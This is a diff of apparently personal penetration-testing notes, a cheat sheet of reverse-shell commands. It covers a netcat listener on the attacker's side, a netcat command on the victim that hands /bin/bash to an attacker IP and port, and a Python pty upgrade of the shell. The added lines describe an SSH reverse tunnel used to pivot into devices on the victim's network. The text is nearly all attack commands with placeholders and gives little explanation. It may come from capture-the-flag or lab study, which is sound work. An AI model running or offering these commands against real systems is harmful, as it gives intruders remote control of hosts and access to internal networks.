@@ -2,5 +2,7 @@ I - nc -lvnp <PORT> --> on attack
 
 II - nc <IP> <PORT> -e /bin/bash --> on victim
 
-
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+On the reverse (127.0.0.0), it allow to curl the content of a device on the same network
+ssh -R 127.0.0.0:<PORT_ATTACK>:<IP_VICTIM>:<PORT_VICTIM> <LOGIN>@<IP_ATTACKER>
